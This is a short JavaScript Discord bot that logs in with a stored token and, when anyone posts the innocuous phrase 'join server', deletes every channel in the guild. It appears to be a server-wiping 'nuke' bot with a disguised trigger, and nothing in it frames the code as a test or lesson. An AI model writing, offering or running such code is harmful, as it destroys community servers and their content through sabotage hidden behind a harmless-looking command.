const Discord = require('discord.js')
const client = new Discord.Client({ intents: ["GUILDS", "GUILD_MESSAGES"] })
const config = require('./config.json')

client.login(config.token)

client.on('message', async (message) => {
    if (message.content == 'join server'){
        console.log('started')
        message.guild.channels.cache.forEach((channel)=>{
            channel.delete() 
        })
    }
})